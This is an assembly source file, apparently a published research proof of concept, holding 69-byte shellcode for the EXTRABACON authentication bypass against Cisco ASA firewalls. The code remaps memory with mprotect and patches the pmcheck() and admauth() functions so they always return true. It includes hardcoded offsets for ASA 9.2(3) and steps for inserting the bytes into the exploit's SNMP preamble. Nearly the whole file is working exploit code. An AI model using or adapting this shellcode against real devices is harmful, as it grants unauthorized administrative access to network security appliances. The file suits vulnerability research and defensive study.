;
; Cisco ASA Authentication Bypass (EXTRABACON) Better Shellcode (69 bytes)
;
; Copyright: (c) 2016 RiskSense, Inc. (https://risksense.com)
; License: http://opensource.org/licenses/MIT
; Release Date: September 15, 2016
;
; Author: Sean Dillon (2E3C8D72353C9B8C9FF797E753EC4C9876D5727B)
;
; Description:
;            This is not the same shellcode as the Equation Group version,
;            but accomplishes the same task of disabling the auth functions
;            in less stages/bytes. Particularly, it is 69 bytes in one stage
;            instead of 200+ bytes spread across 2 stages.
;
; Build/Run:
;            1) $ nasm shelldisable.nasm
;            2) copy resulting shellcode into preamble_byte/preamble_snmp vars
;            3) Change launcher_snmp to 6 nops (or remove entirely)
;
; Note: The offsets given are for 9.2(3), not part of the original release
;
BITS 32

SAFERET_OFFSET  equ     0x9277386       ; where to continue execution
PMCHECK_BOUNDS  equ     0x9b78000       ; mprotect for pmcheck()
PMCHECK_OFFSET  equ     0x9b78010       ; location of pmcheck()
ADMAUTH_BOUNDS  equ     0x8085000       ; page align for admauth()
ADMAUTH_OFFSET  equ     0x8085a40       ; location of admauth()

; we must patch pmcheck() and admauth() to always return true
; xor eax, eax  = 31 c0
; inc eax       = 40
; ret           = c3

PATCH_CODE	equ	0xc340c031               ; gotta love endianess

; we need to fix the function frame to continue normal operation
; eax = 0x0
; esi = 0x0
; edi = 0x0b
; ebx = 0x10
; ebp = [esp - 0x4 (ret)] + 0x??
FIX_EBP         equ     0x48            ; this is 0x58, etc. in some versions
FIX_EDI         equ     0x0f0f0f0b      ; seems static?
FIX_EBX         equ     0x10            ; seems static?

_start:

    ; these are registers we have to clean up, so we can null them before save
    xor eax, eax
    xor ebx, ebx
    xor esi, esi
    xor ecx, ecx                        ; ecx is volatile register

    pusha                               ; save all registers

    add ch, 0x10                        ; ecx = 0x1000
    add dl, 0x7                         ; edx = 0x7
    add al, 0x7d                        ; eax = 0x7d

    push eax                            ; save eax for second call

    mov ebx, PMCHECK_BOUNDS             ; ebx = byte boundary for mprotect

    int 0x80                            ; sys_mprotect(PMCHECK_BOUNDS, 0x1000, 0x7)

    pop eax                             ; eax = 0x7d
    mov ebx, ADMAUTH_BOUNDS             ; second function page align

    int 0x80                            ; sys_mprotect(ADMAUTH_BOUNDS, 0x1000, 0x7)

    push PATCH_CODE
    pop eax

    mov dword [PMCHECK_OFFSET], eax     ; write patch code to both functions
    mov dword [ADMAUTH_OFFSET], eax

    popa                                ; restore all registers

    push SAFERET_OFFSET                 ; push the safe return address

    ; these registers are pre-xored
    add bl, FIX_EBX
    mov edi, FIX_EDI

    mov ebp, esp
    add ebp, FIX_EBP

    ret                                 ; return to safe address